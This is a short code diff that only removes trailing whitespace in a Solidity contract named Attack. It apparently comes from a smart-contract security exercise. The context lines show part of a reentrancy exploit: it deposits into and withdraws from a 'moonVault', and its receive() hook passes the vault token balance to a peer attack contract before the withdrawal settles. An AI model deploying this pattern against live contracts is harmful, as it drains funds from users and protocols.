@@ -31,11 +31,11 @@ contract Attack {
     function setAttackPeer(Attack _attackPeer) external {
         attackPeer = _attackPeer;
     }
-    
+
     receive() external payable {
         if (address(moonVault).balance >= 1 ether) {
             moonToken.transfer(
-                address(attackPeer), 
+                address(attackPeer),
                 moonVault.getUserBalance(address(this))
             );
         }
@@ -46,7 +46,7 @@ contract Attack {
         moonVault.deposit{value: 1 ether}();
         moonVault.withdrawAll();
     }
-    
+
     function attackNext() external {
         moonVault.withdrawAll();
     }
